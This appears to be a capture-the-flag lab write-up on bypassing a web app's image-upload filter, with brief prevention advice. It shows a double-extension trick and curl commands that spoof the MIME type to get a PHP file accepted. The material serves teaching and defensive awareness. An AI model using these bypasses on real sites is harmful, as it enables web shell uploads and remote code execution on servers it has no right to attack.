# Upload bypass

## Impact of a File Upload Attack

- **Phishing attacks** :Hackers can trick users with malicious scripts to gain access to sensitive data.

- **Remote code execution** : Attackers leverage file upload commands to upload a web shell that allows them to execute arbitrary commands on the application server.

## Preventing file upload vulnerability

- **Validate File Formats and Extensions** : Make sure you check the file extension of uploaded files against a white-list of permitted file types. Do this on the server-side, since client-side checks can be circumvented.

- **File upload validation** : When validating file uploads, use trusted validation frameworks that address all potential gaps that attackers could exploit

- **File name restrictions** : Once a file has been uploaded, remove all potentially dangerous characters, including unicode characters and special characters, to prevent injection attacks. Changing the uploaded fileâ€™s name is also recommended to prevent directory path exploits.

- **File size restrictions**: Enforce a file size limit and a maximum number of files that can be uploaded to keep attackers from flooding file storage.

## Attack scenario

In ?page=upload page we are asket to upload an image so lets try to upload a malicious file first i tried a file .php and got this response

> Your image was not uploaded.

then I tried next .php.jpg the response was

> /tmp/file.php.jpg succesfully uploaded.

But no flag so there is another way to do it lets try with curl 

> -X to specify the method type in our case its POST

> -F specify data to send (files) example email=blabla@blabla.bla the email is the name of the input

In our case there is 2 input the first one is uploaded that contain the data then Upload to submit

> curl -i -X POST -F "uploaded=@/Users/oel-ouar/Desktop/file.php" -F Upload=Upload http://ipaddress/?page=upload

We got the same response now lets try to change the mime type of the file

> curl -i -X POST -F "uploaded=@/Users/oel-ouar/Desktop/file.php;type=image/jpg" -F Upload=Upload http://10.12.177.243/?page=upload

Worked !
